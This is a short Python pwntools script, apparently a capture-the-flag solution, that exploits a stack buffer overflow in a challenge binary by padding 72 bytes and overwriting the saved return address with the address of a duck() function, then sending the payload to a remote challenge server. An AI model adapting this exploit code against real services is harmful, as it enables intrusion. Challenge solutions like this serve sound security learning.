"""
Author: Navid Fazle Rabbi (DL28)
Summary: Build a tiny buffer-overflow payload that jumps to duck() either locally or on the remote service.
"""

from __future__ import annotations

from argparse import ArgumentParser

from pwn import ELF, context, p64, remote


def parse_args() -> tuple[str, str, int, int]:
    """Collect CLI arguments for the binary path, host, port, and buffer offset."""
    parser = ArgumentParser(description="Exploit duck() by overwriting the saved return address.")
    parser.add_argument("--binary", default="./chall", help="Path to the local ELF (default: ./chall)")
    parser.add_argument("--host", default="chall.v1t.site", help="Remote host (default: chall.v1t.site)")
    parser.add_argument("--port", type=int, default=30210, help="Remote port (default: 30210)")
    parser.add_argument("--offset", type=int, default=72, help="Offset to saved RIP (default: 72)")
    args = parser.parse_args()
    return args.binary, args.host, args.port, args.offset


def find_duck(binary_path: str) -> int:
    """Load the ELF and return the address of duck()."""
    elf = ELF(binary_path, checksec=False)
    return elf.symbols["duck"]


def build_payload(offset: int, target: int) -> bytes:
    """Create padding followed by the desired return address."""
    return b"A" * offset + p64(target)


def send_payload(host: str, port: int, payload: bytes) -> None:
    """Connect to the remote service, send the payload, and dump any response."""
    with remote(host, port, timeout=5) as conn:
        conn.send(payload)
        try:
            response = conn.recvall(timeout=2)
        except EOFError:
            response = b""
    print(response.decode(errors="replace"))


def main() -> None:
    """Glue the helper functions together and launch the exploit."""
    context.log_level = "warning"
    binary, host, port, offset = parse_args()
    duck_addr = find_duck(binary)
    payload = build_payload(offset, duck_addr)
    send_payload(host, port, payload)


if __name__ == "__main__":
    main()
